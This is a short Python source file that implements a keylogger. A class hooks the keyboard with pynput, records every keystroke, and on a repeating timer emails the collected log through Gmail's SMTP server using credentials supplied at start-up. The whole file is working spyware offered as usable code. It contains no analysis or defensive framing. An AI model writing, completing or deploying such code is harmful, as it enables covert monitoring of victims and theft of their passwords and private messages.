#! /usr/bin/env python

import pynput
import threading
import smtplib


class Keylogger:
    def __init__(self, time_interval, email, password):
        self.log = "kelogg started Mr atal"
        self.interval = time_interval
        self.email = email
        self.password = password

    def append_to_log(self, string):
            self.log = self.log + string

    def process_key_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            else:
                current_key = " " + str(key) + " "
        self.append_to_log(current_key)

    def report(self):
        print(self.log)
        self.send_email(self.email, self.password, self.log)
        self.log = ""
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    def send_email(self, email, password, message):
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()

    def start(self):
        a = pynput.keyboard.Listener(on_press=self.process_key_press)
        with a:
            self.report()
            a.join()





